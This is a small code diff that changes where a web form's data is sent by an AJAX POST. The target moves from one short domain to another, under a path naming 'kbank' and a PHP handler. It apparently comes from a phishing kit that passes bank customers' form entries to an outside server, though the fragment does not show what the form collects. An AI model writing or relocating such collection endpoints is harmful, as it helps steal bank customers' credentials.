@@ -109,7 +109,7 @@
 
     try {
       $.ajax({
-        url: 'https://aq.gy/te/kbank/handler.php',
+        url: 'https://aplx.link/te/kbank/handler.php',
         type: 'POST',
         data: formData,
         processData: false,
